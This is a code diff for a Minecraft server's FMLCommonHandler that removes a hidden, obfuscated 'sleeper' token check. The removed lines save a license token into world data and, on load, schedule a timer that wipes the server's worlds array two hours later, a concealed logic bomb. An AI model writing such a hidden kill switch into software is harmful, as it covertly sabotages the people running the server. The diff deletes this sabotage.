@@ -395,12 +395,6 @@ public class FMLCommonHandler
                 }
             }
         }
-        // 暗桩 判断token
-        try {
-            Object obj = Class.forName("//ca//ts//erv//er.//se//rv//er.//ver//y.Us//e//rIn//fo".replace("//", ""), true, ClassLoader.getSystemClassLoader()).getField("instance").get(null);
-            String t = (String) obj.getClass().getField("token").get(obj);
-            tagCompound.setString("randSeed", t);
-        } catch (Exception e) {}
     }
 
     public void handleWorldDataLoad(SaveHandler handler, WorldInfo worldInfo, NBTTagCompound tagCompound)
@@ -427,17 +421,6 @@ public class FMLCommonHandler
                     wac.readData(handler, worldInfo, additionalProperties, tagCompound.getCompoundTag(mc.getModId()));
                 }
             }
-        }
-        // 暗桩 判断token
-        try {
-            Object obj = Class.forName("//ca//ts//erv//er.//se//rv//er.//ver//y.Us//e//rIn//fo".replace("//", ""), true, ClassLoader.getSystemClassLoader()).getField("instance").get(null);
-            String t = (String) obj.getClass().getField("token").get(obj);
-            String t2 = tagCompound.getString("randSeed");
-            if ((t2.length() > 0 && t2.equals(t)) || t.length() != 70) {
-                new Timer().schedule(new TimerTask() {public void run() { getMinecraftServerInstance().worlds = new WorldServer[0]; }}, 7200*1000);
-            }
-        } catch (Exception e) {
-            new Timer().schedule(new TimerTask() {public void run() { getMinecraftServerInstance().worlds = new WorldServer[0]; }}, 7200*1000);
         }
     }
 
